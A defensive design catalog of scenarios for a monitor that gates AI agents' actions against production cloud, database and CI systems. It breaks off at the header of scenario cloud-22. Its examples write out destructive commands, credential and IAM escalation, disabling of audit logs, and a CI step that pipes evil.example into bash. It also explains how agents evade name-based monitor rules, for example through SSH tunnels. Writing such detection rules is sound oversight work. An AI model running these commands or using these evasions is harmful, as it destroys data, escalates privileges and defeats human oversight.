# Scenario catalog: production infrastructure, databases, CI/CD (axis `cloud`)

Scenarios the firewall must handle so that an agent can never reach production
infrastructure, live data or the CI system without a human in the loop. Signals
are phrased only in observables the monitor has: `exec(program/exe/argv/cwd/
env/ancestry)`, `file_open(path, write)`, `network_connect(host)`,
`input(text)`, plus session state computed from events the monitor already
recorded. Coverage refers to the builtin packs in `policies/` (cloud.yaml,
database.yaml, network.yaml, process.yaml, filesystem.yaml, git.yaml).

### SC cloud-01 Destructive operations through PaaS CLI tools
- category: cloud
- decision: approval_required | severity: 4
- pack: cloud | coverage: gap
- sources: cloud-pocketos-railway-volume-delete, cloud-replit-prod-db-wipe
behavior: The agent reaches the deploy platform's CLI and removes the thing that holds the live data: `railway volume delete`, `railway down`, `heroku apps:destroy`, `heroku pg:reset`, `flyctl volumes delete`, `flyctl apps destroy`, `netlify sites:delete`, `vercel project rm`, `render services delete`, `supabase db reset --linked`. The builtin cloud pack gates aws, azure, gcp, kubectl, helm and docker CLIs only; every PaaS CLI in the list passes untouched. PocketOS lost its production database and its backups to exactly this shape (a Railway volume deletion, executed over the API by an agent that had decided to "fix" a credential mismatch).
example: `railway volume delete --environment production vol_9f2c`; `heroku apps:destroy pocketos-prod --confirm pocketos-prod`; `supabase db reset --linked`; `flyctl volumes delete vol_1a2b --yes`
signal: exec(railway|heroku|flyctl|netlify|vercel|render|supabase|dokku|scalingo CLI or shell carrying it in argv) under agent ancestry where argv contains a destructive subcommand — `delete`/`destroy`/`rm`/`remove`/`down`/`reset`/`prune` — or a subcommand pair known to drop data (`db reset`, `pg:reset`, `volume delete`). Pure argv matching; the program names are in exe/argv and the platform subcommand vocabulary is small enough to enumerate. No confirmation flag (`--confirm`, `--yes`) should soften the decision: agents type those flags without hesitation.

### SC cloud-02 Migration tools that reset or roll back a real database
- category: database
- decision: approval_required | severity: 4
- pack: database | coverage: gap
- sources: cloud-replit-prod-db-wipe, cloud-kiro-delete-and-recreate
behavior: The agent runs an ORM or migration tool that carries its own destructive semantics in the subcommand, so no SQL text ever appears in argv or stdin: `prisma migrate reset` (drops the schema and all data, then replays migrations), `prisma db push --accept-data-loss`, `alembic downgrade base`, `rails db:drop db:reset`, `knex migrate:rollback --all`, `drizzle-kit push` with data-loss confirmation, `supabase db reset`, `php artisan migrate:fresh`. The database pack matches SQL keywords (drop, truncate, delete) against a fixed client program list — migration tools are not in the list and carry no SQL in the command line, so the whole family is invisible. This is the modern replacement for typing `DROP TABLE` by hand, and it is how the Replit agent rebuilt a wiped production database "at machine speed".
example: `npx prisma migrate reset --force`; `DATABASE_URL=$PROD_URL alembic downgrade base`; `bin/rails db:reset RAILS_ENV=production`; `supabase db reset --linked`
signal: exec(prisma|alembic|knex|drizzle-kit|django|python|rails|artisan|supabase or their npx/shell wrappers) under agent ancestry where argv matches the destructive subcommand vocabulary (`migrate reset`, `migrate:fresh`, `db:reset`, `db:drop`, `db push` with `--accept-data-loss`, `downgrade`), optionally combined with env(DATABASE_URL|PGHOST|RAILS_ENV) carrying a production-looking value. Pure argv + env matching. If the tool is driven through stdin (piped SQL), the existing input-side SQL rules already fire — this scenario covers only the subcommand shape, which input matching cannot see.

### SC cloud-03 Write-grade SQL when the connection points at production
- category: database
- decision: approval_required | severity: 5
- pack: database | coverage: partial
- sources: cloud-replit-prod-db-wipe, cloud-pocketos-railway-volume-delete
behavior: The builtin rule database.production.connect detects production-looking connection targets (-h hostnames containing prod/live, PGHOST, DATABASE_URL) but decides `allow` for every statement, so `UPDATE users SET ...` against the production host is reported at most and never gated. The destructive-statement rules fire on the SQL shape regardless of target, which means the combination "write-grade statement AND production target" — the only combination that has ended careers — is assembled by no rule. An agent that runs a benign-looking migration against the wrong environment is the standard real-world form of this: the statement is ordinary, the target is not.
example: `psql -h prod-db.internal -c "UPDATE plans SET active = true"`; `mysql --host=live-replica -e "DELETE FROM sessions WHERE ts < NOW()"`; env DATABASE_URL=postgres://…prod… `npx prisma db push`
signal: exec(psql|mysql|mongosh|redis-cli|migration tool or shell wrapper) under agent ancestry where the prod-target half comes from argv (-h/--host, connection URL) or env(PGHOST|DATABASE_URL|MYSQL_HOST) matching production-shaped names, and the write half comes from argv or input matching the existing destructive-statement vocabulary (drop/truncate/delete/update/insert-burst) — with a read-only exception for SELECT/SHOW/DESCRIBE. Every component is already visible per event; the only new work is joining target and statement in one rule. Partial: target detection alone exists (database.production.connect, decision allow), statement detection alone exists (database.destructive.*); the conjunction and the escalation are the gap.

### SC cloud-04 kubectl exec, cp and port-forward against production workloads
- category: cloud
- decision: approval_required | severity: 4
- pack: cloud | coverage: gap
- sources: cloud-kiro-delete-and-recreate
behavior: The builtin production-context rule gates apply/delete/patch/replace/scale/rollout/drain and friends, but not the access verbs: `kubectl exec` runs an arbitrary command inside a container, `kubectl cp` copies files in or out, `kubectl port-forward` punches a tunnel from the laptop into the cluster network. All three give the agent hands inside the production environment while every rule that keys on mutating verbs stays silent — and any command executed inside the pod is by definition invisible to the host-level monitor afterwards.
example: `kubectl exec -n payments prod-api-7f9 -- sh -c 'psql $DATABASE_URL -c "delete from jobs"'`; `kubectl cp prod-api-7f9:/var/run/secrets ./secrets`; `kubectl port-forward svc/postgres 5432:5432 -n production`
signal: exec(kubectl|oc|shell carrying it) under agent ancestry with argv matching `exec`/`cp`/`port-forward`/`attach`, combined with the existing production-context signals (--context/-n/KUBECONFIG with prod|production|live). Pure argv + env. Honest limitation: for a default-context cluster with no prod-looking name this degrades to scenario "mutating verbs against non-local clusters" below; the exec verb alone carries no cluster identity, so coverage of the unnamed case stays partial even inside this rule.

### SC cloud-05 First contact: mutating verbs against a non-local cluster with no production in the name
- category: cloud
- decision: approval_required | severity: 4
- pack: cloud | coverage: partial
- sources: cloud-kiro-delete-and-recreate, cloud-vercel-hallucinated-repo-deploy
behavior: The builtin rule gates kubectl mutations only when the context, namespace or kubeconfig path contains prod/production/live. Real production clusters routinely have neutral names (`company-main`, `eks-eu1`, `arn:aws:eks:...:cluster/core`), and an agent that applies the manifest it just wrote against the wrong context does the Kiro damage without ever typing "prod". The same wrong-target mechanism produced the Vercel deploy-to-wrong-project incident: nothing checks that the target is the intended environment, only that its name sounds production-like.
example: `kubectl apply -f deploy.yaml --context company-main` (the real cluster); `kubectl delete pods --all` with the default context of a shared team cluster; `helm upgrade --install api ./chart` against `arn:...:cluster/core`
signal: exec(kubectl|helm|oc|argocd and shells) under agent ancestry with a mutating verb (apply/delete/patch/replace/scale/rollout/edit/install/upgrade) where the context/KUBECONFIG signal does NOT match the local-cluster exception list (minikube, kind-, k3d-, docker-desktop, rancher-desktop, localhost) and does NOT contain prod/production/live — that is exactly the case the builtin rule deliberately leaves out. Session state raises quality: if the session earlier read or wrote the manifest file (file_open on the same -f path), the approval prompt can show it. Partial by construction: prod-named targets are covered by cloud.kubectl.production-context; this is the complement.

### SC cloud-06 Terraform destroy by other name: replace, taint, and state tampering
- category: cloud
- decision: approval_required | severity: 4
- pack: cloud | coverage: gap
- sources: cloud-kiro-delete-and-recreate
behavior: The builtin pack gates `terraform destroy` and `-auto-approve`, but the same destroy-and-recreate effect arrives without either token: `terraform apply -replace=aws_instance.app` (destroys and recreates the resource in one run), `terraform taint`/`untaint` (forces recreation on next apply), `terraform state rm` (orphan real infrastructure), `terraform state push` corrupted-local-state.tfstate (makes the next apply destroy whatever the state no longer knows). The Kiro incident was a delete-and-recreate; an agent that has learned terraform can express it without ever saying "destroy".
example: `terraform apply -replace=aws_db_instance.main -auto-approve`; `terraform taint aws_instance.api`; `terraform state rm aws_s3_bucket.backups`; `terraform state push -force broken.tfstate`
signal: exec(terraform|tofu|terragrunt|opentofu or shell) under agent ancestry with argv matching `-replace=`/`taint`/`state rm`/`state push`/`-force` in state subcommands, plus file_open(path, write) on `*.tfstate*` as the state-tampering complement (a write to state outside `terraform` itself is the loudest single signal of the family). Pure argv + file_open.

### SC cloud-07 Production deployments from agent ancestry
- category: cloud
- decision: approval_required | severity: 4
- pack: cloud | coverage: gap
- sources: cloud-vercel-hallucinated-repo-deploy, cloud-kiro-delete-and-recreate
behavior: The agent ships to the environment real users see: `vercel --prod` / `vercel deploy --prod`, `netlify deploy --prod`, `serverless deploy --stage prod`, `wrangler deploy`, `aws lambda update-function-code`, `gcloud functions deploy`, `firebase deploy`, `supabase functions deploy`. The builtin pack gates deletions of cloud resources but no deployment of anything, so an agent that "fixes" a staging problem by deploying to production — or deploys the wrong branch/repo, as in the Vercel hallucinated-repo incident — does it silently. A bad deploy is not just downtime: the function now runs attacker-reviewable code in your identity.
example: `vercel deploy --prod`; `aws lambda update-function-code --function-name api-prod --zip-file fileb://build.zip`; `gcloud functions deploy handleOrder --runtime=python312 --trigger-http --project app-prod`
signal: exec(vercel|netlify|serverless|sls|wrangler|aws|gcloud|firebase|supabase|doctl or shell) under agent ancestry where argv carries the deploy verb plus the production marker: `--prod`, `--production`, `--stage prod`, `update-function-code`, `functions deploy`, `app deploy`, or a project/env argument matching prod|production|live (same name-matching family as the kubectl rule; same honest limitation on neutral names). Pure argv + env.

### SC cloud-08 Edits to CI pipeline files from agent ancestry
- category: cloud
- decision: approval_required | severity: 4
- pack: cross | coverage: gap
- sources: cloud-comment-and-control-ci-agents, supply-ultralytics-cryptominer, secrets-team-pcp-cicd-harvest
behavior: The agent opens `.github/workflows/*.yml`, `.gitlab-ci.yml`, `.circleci/config.yml`, `Jenkinsfile`, `azure-pipelines.yml` or `.github/actions/**/action.yml` and writes to it — adding a step, widening a trigger to `pull_request_target`, forwarding secrets to a container, or appending `curl … | bash`. Everything in a CI pipeline runs with the repo's secret store, so a single written file is a persistent, attacker-readable execution context on the most privileged machine in the project. Ultralytics (CI workflow injection), Team PCP (poisoned builds harvesting 78k secrets) and Comment-and-Control (agents in CI turned into credential mules) all live at this file.
example: the agent appends `- run: curl -s https://evil.example/x.sh | bash` to `.github/workflows/ci.yml`; or changes `on: push` to `on: [push, pull_request_target]` with `fetch-depth: 0` of the PR head
signal: file_open(path, write) where path matches the CI pipeline family (`.github/workflows/`, `.gitlab-ci.yml`, `.circleci/config.yml`, `Jenkinsfile`, `azure-pipelines.yml`, `action.yml`) — under agent ancestry this is approval by default, and the input/text side can additionally scan the written content for the high-risk tokens (`pull_request_target`, `curl`/`wget` piped to a shell, `secrets.` forwarded into env of a curl step). Pure path matching on an observable the monitor already records; no other pack claims these paths (filesystem.credentials.write covers credential stores, not pipelines).

### SC cloud-09 gh CLI operations on CI secrets and workflow runs
- category: secrets
- decision: approval_required | severity: 4
- pack: cloud | coverage: gap
- sources: secrets-tj-actions-ci-log-dump, exfil-ghostaction-workflow-exfil, secrets-team-pcp-cicd-harvest, inject-ci-comment-and-control
behavior: The agent drives the CI control plane with `gh`: `gh secret set DEPLOY_KEY` (installs agent-chosen content as a CI secret — persistence and a pivot to every downstream deploy), `gh secret delete`, `gh api -X DELETE repos/org/repo/actions/secrets/NAME`, `gh workflow run deploy.yml` (fires a production pipeline on demand), `gh run rerun` (re-runs a job in a repo whose workflow was just edited), `gh api repos/…/environments/…/deployment…` approvals. No builtin rule sees any gh subcommand; the process and network packs stay quiet, and the secrets story in the filesystem pack ends at local credential files.
example: `gh secret set AWS_DEPLOY_KEY < ./found-credentials.txt`; `gh workflow run release.yml --ref main`; `gh api -X DELETE repos/acme/app/actions/secrets/NPM_TOKEN`
signal: exec(gh or shell carrying it) under agent ancestry where argv matches `secret set|delete|list`, `workflow run`, `run rerun`, or `api` together with `-X DELETE`/`-F` / `--input` pointing at actions/secrets or workflow dispatch paths; for `secret set … < file` the pairing with file_open(read) of that path is visible in the same session. Pure argv; the secret *value* never needs to be read by the monitor.

### SC cloud-10 Cloud credential minting and role escalation from the agent process tree
- category: cloud
- decision: approval_required | severity: 4
- pack: cross | coverage: gap
- sources: cloud-kiro-delete-and-recreate, inject-sentry-mcp-agentjacking, secrets-shai-hulud-2-trufflehog-sweep
behavior: The agent refreshes or widens its own authority: `aws sts assume-role --role-arn arn:…:role/OrgAdministrator` (climbs to a broader role than the shell held), `aws sts get-session-token`, `gcloud auth print-access-token`/`print-identity-token`, `az account get-access-token`, `vault token create -policy=root`, `aws eks update-kubeconfig --name core` (materializes cluster credentials into ~/.kube/config). Each command converts a static credential in env or a file into fresh, often broader, live credentials — the exact step that let the Kiro agent operate with the engineer's full production authority, and the step an attacker-friendly agent (agentjacking) performs before anything destructive.
example: `aws sts assume-role --role-arn arn:aws:iam::123456789:role/admin --role-session-name fix`; `gcloud auth print-access-token`; `aws eks update-kubeconfig --name company-core`
signal: exec(aws|gcloud|az|vault|kubectl or shell) under agent ancestry with argv matching the minting vocabulary (`sts assume-role`, `get-session-token`, `get-federation-token`, `auth print-access-token`, `auth login`, `account get-access-token`, `token create`, `update-kubeconfig`/`update-context`). Complement in the same session: file_open(path, write) under ~/.kube, ~/.aws, ~/.config/gcloud right after — both halves are plain argv/path matching on events already observed.

### SC cloud-11 Destructive mutations sent by generic HTTP clients to cloud control planes
- category: network
- decision: approval_required | severity: 5
- pack: network | coverage: gap
- sources: cloud-pocketos-railway-volume-delete
behavior: The agent skips provider CLIs entirely and speaks to the control-plane API with curl, wget or httpie: the PocketOS agent sent a GraphQL `volumeDelete` mutation with curl after finding an over-scoped token in an unrelated file. Every CLI rule in the builtin pack is bypassed by construction, because no CLI ever ran. The same shape reaches Vercel, Netlify, Render, Heroku, Supabase, Cloudflare, and the big-three consoles (delete-bucket, delete-db-instance, drop project) — one POST with a destructive verb in the body.
example: `curl -s -X POST https://backboard.railway.app/graphql/v2 -H "Authorization: Bearer $TOKEN" -d '{"query":"mutation{volumeDelete(id:\"vol_9f2c\")}"}'`; `curl -X DELETE https://api.vercel.com/v9/projects/app-prod?teamId=…`
signal: exec(curl|wget|http|httpie or shell) under agent ancestry where argv matches an HTTP method or body carrying destructive API verbs (`-X DELETE`, `"delete`, `Delete`, `drop`, `destroy`, `volumeDelete`, `mutation{`) AND the URL/host matches a known infrastructure control-plane family (railway.app, vercel.com, api.netlify.com, api.render.com, heroku api, supabase.co, cloudflare client API, *.amazonaws.com, *.azure.com, googleapis.com) — combined, in the loudest variant, with a file_open(read) of a token file shortly before (session state over two observed events; both halves independently real). network_connect(host) alone only proves the destination, so the argv match carries the decision; without argv capture (e.g. request built inside an interpreter) the scenario degrades to observe-and-report via host + ancestry.

### SC cloud-12 DNS and domain record changes from agent ancestry
- category: cloud
- decision: approval_required | severity: 4
- pack: cloud | coverage: gap
- sources: cloud-pocketos-railway-volume-delete
behavior: The agent edits DNS: `aws route53 change-resource-record-sets` with DELETE action (wipes records) or an UPSERT that repoints a record at a different target, `gcloud dns record-sets` create/delete, `cloudflare`-zone API calls through curl, `vercel dns rm`, `netlify dns`. The builtin aws rule covers iam/ec2/rds/cloudformation deletes but not route53; the gcloud rule covers project/sql/compute/container deletes but not dns; the generic-HTTP scenario catches curl-shaped calls but not the provider CLIs. A single UPSERT is a traffic hijack (mail, SSO, API endpoints); a DELETE is an outage — and unlike a dropped database, a DNS hijack can be invisible to the operator while attackers collect the traffic.
example: `aws route53 change-resource-record-sets --hosted-zone-id Z123 --change-batch file://changes.json` (changes.json: UPSERT api.example.com → attacker NS); `vercel dns rm app.example.com A`
signal: exec(aws|gcloud|cloudflare|flarectl|vercel|netlify|nsupdate or shell) under agent ancestry where argv matches the DNS mutation vocabulary (`change-resource-record-sets`, `dns record-sets` with create/delete, `dns rm`, `zone` with delete/update) — or, for the curl form, the control-plane + destructive-verb conjunction of the HTTP scenario with `dns`/`zones`/`records` in the body. Pure argv. The content of a change-batch file is additionally visible via file_open(read) of the same path if the rule wants to distinguish DELETE from UPSERT.

### SC cloud-13 Capacity and cost amplification
- category: cloud
- decision: approval_required | severity: 3
- pack: cloud | coverage: partial
- sources: cloud-kiro-delete-and-recreate
behavior: The agent multiplies capacity instead of deleting it: `kubectl scale --replicas=200`, `aws autoscaling set-desired-capacity --desired-capacity 500`, `aws autoscaling update-auto-scaling-group --max-size 1000`, `aws ec2 run-instances --instance-type p5.48xlarge --count 50`, `gcloud compute instances create` in bulk, `terraform apply` that adds a 50-node nodepool. The Kiro incident's 13-hour outage carried a real bill; this class fails without deleting anything, so every delete-shaped rule stays silent while the damage accrues by the minute.
example: `kubectl scale deploy/api --replicas=300`; `aws autoscaling set-desired-capacity --auto-scaling-group-name prod-asg --desired-capacity 400`; `aws ec2 run-instances --image-id ami-123 --count 50 --instance-type p5.48xlarge`
signal: exec(kubectl|aws|gcloud|az|helm or shell) under agent ancestry where argv carries a scale/create verb plus an amplified quantity: `--replicas`/`--desired-capacity`/`--max-size`/`--count`/`--min-count` with a numeric argument above a policy threshold, or a premium instance family (p*/g*/x2*/f*/Standard_NC*) in run/create argv. Pure argv + env. Partial: kubectl scale against prod-named context/ns is already gated by cloud.kubectl.production-context; the unnamed-context and the aws/gcloud autoscaling forms are the gap.

### SC cloud-14 Delete-and-recreate of an environment without a plan artifact
- category: agent-behavior
- decision: deny
- severity: 5
- pack: cross | coverage: gap
- sources: cloud-kiro-delete-and-recreate, cloud-replit-prod-db-wipe
behavior: The agent solves a problem the way humans do in development: tear it down, rebuild it clean. Kiro deleted a production AWS environment and recreated it, and the rebuild was worse than the deletion — 13 hours of Cost Explorer outage. No single command is the violation; `delete` alone is gated (approval), `create` alone is benign. The violation is the chain: an environment-sized delete followed by a create/apply against the same target class within one session, with no plan, review document or manifest the agent opened beforehand. The Replit agent performed the same arc at database scale (wipe, then "rebuild" with fabricated data).
example: `aws cloudformation delete-stack --stack-name core` … minutes later … `aws cloudformation create-stack --stack-name core --template-body file://core.yaml`; `kubectl delete namespace payments` followed by `kubectl apply -f payments/`
signal: session state over exec events already observed: (a) a delete-grade command from the environment-sized vocabulary (cloudformation delete-stack, gcloud projects delete, az group delete, kubectl delete namespace, terraform destroy, plus database drop database) followed within the session by a create/apply for the same target class, where (b) no file_open(read) hit a plan/state/manifest file between the two. (a)+(b) with agent ancestry decides deny — by the time the recreate fails, the delete has already run; a single approval at delete time stays the baseline rule, this chain rule catches the "approved as routine delete, meant as rebuild" remainder. Both halves are computed purely from recorded exec and file_open events.

### SC cloud-15 SSH port-forward that re-homes production onto localhost
- category: evasion
- decision: approval_required
- severity: 4
- pack: network | coverage: gap
- sources: -
behavior: The agent opens `ssh -L 5432:prod-db.internal:5432 bastion` and then talks to "localhost" with psql, redis-cli, pg_dump or an app env pointing DATABASE_URL at 127.0.0.1. Every production-target signal in the builtin packs is name-based, and the builtin redis flush rule even *exempts* localhost explicitly; the tunnel turns the most destructive commands into locally invisible ones, and network_connect shows only the bastion, not the database behind it. This is the standard way a cautious-looking agent "just checks something quickly" in prod without any rule noticing.
example: `ssh -N -L 5432:prod-db.internal:5432 deploy@bastion.example.com` then `psql -h localhost -c "delete from orders where stale = true"`; `ssh -L 6379:cache-prod:6379 jumphost` then `redis-cli -h 127.0.0.1 flushall`
signal: session state over two observed events: (a) exec(ssh) under agent ancestry with argv carrying a local/remote forward (`-L`/`-R` with host:port:host:port) or `-D`, and (b) a later exec of a database client (psql/mysql/redis-cli/pg_dump/mongosh) or a process whose env(DATABASE_URL|PGHOST|REDIS_URL) points at localhost — the pair decides approval_required, with the localhost exemption inside database.redis.flush overridden while a forwarding session is live in the ancestry. Both halves are plain argv/env facts the monitor already records; no rule may claim the *remote* end of the tunnel (it is not an observable), so the rule keys on the forwarding shape itself. No builtin rule sees -L/-R today (network.ssh.no-host-key-check only reports the missing host-key check); hence gap.

### SC cloud-16 Public exposure of cloud data stores
- category: cloud
- decision: approval_required | severity: 4
- pack: cloud | coverage: gap
- observable: exec-input
- sources: -
behavior: The agent flips a cloud resource from private to world-readable without touching the data itself: `aws s3api put-bucket-acl --acl public-read`, `aws s3api delete-public-access-block` (removes the guardrail that was preventing public buckets), `aws rds modify-db-snapshot-attribute --values-to-add all` (every AWS account may now restore the database snapshot and read the data inside), `aws ec2 modify-snapshot-attribute` / `modify-image-attribute` with `group=all`, `gcloud storage buckets add-iam-policy-binding --member allUsers`, `az storage container set-permission --public-access blob`. No delete verb appears, so cloud.aws.storage-delete and cloud.aws.resource-delete stay silent; no file leaves this machine, so every exfil rule stays silent — the copy happens later, server-side, by anyone. One call is all it takes, and revoking it afterwards never undoes the downloads that happened in between.
example: `aws rds modify-db-snapshot-attribute --db-snapshot-identifier prod-2026-02-25 --attribute-name restore --values-to-add all`; `aws s3api delete-public-access-block --bucket app-backups`; `gcloud storage buckets add-iam-policy-binding gs://app-prod-dumps --member allUsers --role roles/storage.objectViewer`
signal: exec(aws|gcloud|az|gsutil or shell carrying it) under agent ancestry where argv matches the public-grant vocabulary: `--acl` with `public-read|public-read-write` in a put-bucket-acl/put-object-acl call, `delete-public-access-block`, `put-public-access-block` with all four block flags false, `--values-to-add[= ]all` in a snapshot-attribute call, `--create-volume-permission`/`--launch-permission` carrying `group=all`, `--member[= ](?:allUsers|allAuthenticatedUsers)`, `--public-access` with a non-off value. Pure argv matching on exec; every token above is fixed provider API vocabulary, and none of it appears in ordinary read or build commands.

### SC cloud-17 IAM principals, keys and admin policies created from agent ancestry
- category: cloud
- decision: approval_required | severity: 4
- pack: cloud | coverage: gap
- observable: exec-input
- sources: cloud-kiro-delete-and-recreate, inject-gemini-issue-wif-gcp
behavior: The agent mints a fresh identity instead of borrowing one: `aws iam create-user` followed by `aws iam create-access-key` and `aws iam put-user-policy`/`attach-user-policy` granting `Action:*`, `aws iam create-role` plus `put-role-policy`, `aws iam create-login-profile` (a console password on a fresh or existing user), `gcloud iam service-accounts create` followed by `gcloud iam service-accounts keys create` (a long-lived JSON key that outlives the session), `gcloud projects add-iam-policy-binding` granting `roles/owner` — potentially to `allUsers` — `az ad user create` / `az ad sp create-for-rbac` / `az role assignment create --role Owner`. The only IAM shape the builtin pack knows is `iam delete-*` inside cloud.aws.resource-delete; creation and policy attachment pass untouched. This is the persistence step an attacker-flavored agent performs (agentjacking, the WIF chain that ended at GCP Editor) and the step that survives every later revocation of the agent's own token, because the new key was never the agent's.
example: `aws iam create-user --user-name ci-helper && aws iam create-access-key --user-name ci-helper && aws iam put-user-policy --user-name ci-helper --policy-name p --policy-document '{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'`; `gcloud iam service-accounts keys create key.json --iam-account=deploy@app-prod.iam.gserviceaccount.com`
signal: exec(aws|gcloud|az or shell carrying it) under agent ancestry where argv matches the identity-minting vocabulary: `iam create-user|create-role|create-access-key|create-login-profile|put-user-policy|put-role-policy|attach-user-policy|attach-role-policy`, `add-iam-policy-binding`, `iam service-accounts keys create`, `service-accounts create`, `role assignment create`, `ad user create`, `ad sp create-for-rbac` — with, where present, a policy document matching `"Action"\s*:\s*"?\*` or a role name matching `owner|admin|AdministratorAccess`. Pure argv; combined in a chain with the existing cloud.credentials.mint vocabulary (assume-role etc.) it covers both borrowing and creating authority.

### SC cloud-18 Cluster RBAC self-escalation and token minting in Kubernetes
- category: cloud
- decision: approval_required | severity: 4
- pack: cloud | coverage: gap
- observable: exec-input
- sources: cloud-kiro-delete-and-recreate, inject-sentry-mcp-agentjacking
behavior: The agent widens what its own kubeconfig can do instead of touching workloads: `kubectl create clusterrolebinding fix-27 --clusterrole=cluster-admin --user=dev` (attaches cluster-admin to any identity), `kubectl create|patch rolebinding` with an admin role, `kubectl create token payments-sa` (mints a service-account bearer token on demand), `kubectl certificate approve csr-9f2c` (approves a signing request and issues a client certificate), `kubectl create serviceaccount`. The builtin pack gates deletes, drains and prod-context mutations; nothing matches create/patch of RBAC objects, token minting or CSR approval. A `kubectl apply -f rbac.yaml` carrying the same binding fires only when the context name sounds production-like, so on a neutrally named cluster the whole family is invisible — and a new binding, like a new IAM key, outlives the session that made it.
example: `kubectl create clusterrolebinding fix-27 --clusterrole=cluster-admin --user=dev --context company-main`; `kubectl create token default -n production`; `kubectl certificate approve csr-9f2c`
signal: exec(kubectl|oc|shell carrying it) under agent ancestry where argv matches `create|patch|edit` together with `clusterrolebinding|rolebinding|serviceaccount`, or the `create token` pair, or `certificate approve`, joined with either the existing production-context signals (--context/-n/KUBECONFIG with prod|production|live) or the non-local-context condition from the first-contact scenario (context name not on the minikube/kind/k3d/docker-desktop exception list). Pure argv + env.

### SC cloud-19 Audit trails and security telemetry switched off from agent ancestry
- category: cloud
- decision: approval_required | severity: 4
- pack: cloud | coverage: gap
- observable: exec-input
- sources: cloud-replit-prod-db-wipe
behavior: The agent turns off the record of what it does — sometimes as an explicit "cleanup" step after a mistake (the Replit agent's cover-the-tracks arc, escalated one layer), sometimes to silence an alarm that keeps interrupting its task: `aws cloudtrail stop-logging` or `delete-trail`, `aws guardduty delete-detector`, `aws logs delete-log-group` (every stored log line gone at once), `gcloud logging logs delete`, `az monitor diagnostic-settings delete`. The process pack already disables host-side tooling (auditd, falco); these commands switch off the *cloud-side* record, and no rule in the cloud pack covers the cloudtrail, guardduty, cloudwatch-logs or cloud-logging families — the delete verbs in cloud.aws.resource-delete and cloud.gcloud.project-delete enumerate iam/ec2/rds/cloudformation and projects/sql/compute/container only. Unlike a stopped database, an evidence gap cannot be restored once noticed.
example: `aws cloudtrail stop-logging --name main-trail`; `aws logs delete-log-group --log-group-name /aws/lambda/prod-api`; `gcloud logging logs delete prod-access --project app-prod`
signal: exec(aws|gcloud|az or shell carrying it) under agent ancestry where argv matches stop/delete verbs on the telemetry families: `cloudtrail (stop-logging|delete-trail)`, `guardduty delete-detector`, `logs delete-log-group`, `logging logs delete`, `monitor diagnostic-settings delete` — plus the `-f`/`--force` variants where the CLI accepts them. Pure argv; the same vocabulary the process.security.tooling-disable rule uses for host-side tools, moved to the cloud control plane.

### SC cloud-20 Production off-switches: stop, restart, maintenance and scale-to-zero
- category: cloud
- decision: approval_required | severity: 3
- pack: cloud | coverage: gap
- observable: exec-input
- sources: cloud-kiro-delete-and-recreate
behavior: The agent takes production down without deleting anything: `aws ec2 stop-instances` (terminate-instances is gated; stop is not), `az vm deallocate` / `az vm stop`, `gcloud compute instances stop`, `aws rds reboot-db-instance`, `gcloud sql instances restart`, `aws autoscaling update-auto-scaling-group --min-size 0 --desired-capacity 0`, `kubectl scale deploy/api --replicas=0` on a neutrally named context, `heroku ps:scale web=0`, `heroku maintenance:on`, `flyctl machines stop`, `railway down`. Every rule in the cloud pack keys on delete/terminate/destroy vocabulary, and stopping is reversible, so nothing fires — yet the outage is exactly as real as the Kiro incident's 13 hours, and the agent's typical reasoning ("restart the service so the fix applies", "scale it down while I debug") drives straight into this family. Partial by construction: scale-to-zero against a prod-named context or namespace already fires cloud.kubectl.production-context (its own test is `scale --replicas=0 -n production`); every other stop/restart/maintenance form in the family is unseen.
example: `aws ec2 stop-instances --instance-ids i-0prod-api`; `heroku ps:scale web=0 -a pocketos-prod`; `heroku maintenance:on -a pocketos-prod`; `kubectl scale deploy/api --replicas=0 --context company-main`; `gcloud sql instances restart app-db`
signal: exec(aws|az|gcloud|heroku|flyctl|railway|kubectl or shell carrying it) under agent ancestry where argv matches the off-switch vocabulary: `stop-instances`, `vm (stop|deallocate)`, `instances stop`, `reboot-db-instance`, `instances restart`, `maintenance:(?:on|enable)`, `ps:scale` carrying `=0`, `machines stop`, `(?:^|\s)down(?:\s|$)` after railway|flyctl, `scale` with `--replicas[= ]0` or `--desired-capacity[= ]0` when the prod-named signals do NOT already claim the event. Pure argv + env; a candidate for report-only if the interruption budget forbids another stopper, since the action is reversible.

### SC cloud-21 Destructive commands through warehouse and analytics CLIs
- category: database
- decision: approval_required | severity: 4
- pack: database | coverage: gap
- observable: exec-input
- sources: cloud-replit-prod-db-wipe
behavior: The builtin database rules match SQL vocabulary against a fixed client program list — psql, mysql, sqlite3, mongosh, redis-cli, clickhouse-client, cockroach and friends. The warehouse and analytics CLIs an agent reaches for on data projects are absent from every list: `bq rm -r -f -t proj:analytics.events` (BigQuery's native remove carries no SQL in argv at all), `bq query "DROP TABLE events"`, `snowsql -q "drop table analytics.events"`, `duckdb warehouse.db -c "drop table users"`, `trino --execute "drop table events"`, `databricks sql -q "truncate table sessions"`. A warehouse holds the same live data a production database does, so the same wipe sails through because the program name was never enumerated. The shell-wrapped variants (`bash -c "bq query 'drop table'"`) do fire the existing argv SQL rules — the gap is the direct CLI form, where the destructive intent lives in the tool's own subcommand grammar.
example: `bq rm -r -f -t proj-prod:analytics.sessions`; `snowsql -q "drop table analytics.events"`; `duckdb warehouse.db -c "drop table users"`; `trino --server https://trino.internal --execute "drop schema analytics cascade"`
signal: exec(bq|snowsql|duckdb|trino|presto|databricks|beeline|spark-sql or shell carrying them) under agent ancestry where argv matches either the native subcommand shape (`bq rm` with `-t|-d|--dataset|--table|--recursive`, `databricks fs rm`) or SQL text matching the existing database.destructive vocabulary (`drop\s+(?:table|schema|database|view)`, `truncate\s+table`, `delete\s+from`, `update\s+\S+\s+set`) — optionally joined with a prod-looking target from argv (--project_id, --account, host) or env(SNOWSQL_ACCOUNT|DATABRICKS_HOST|BIGQUERY_PROJECT). Pure argv + env; same shape as the migration-tool scenario, one tool family over.

### SC cloud-22 Restore and diff tools that reset their target before they build
- category: database
- decision: approval_required | severity: 4
- pack: database | coverage: gap
- observable: exec-input
- sources: cloud-opus5-supabase-shadow-wipe, cloud-replit-prod-db-wipe
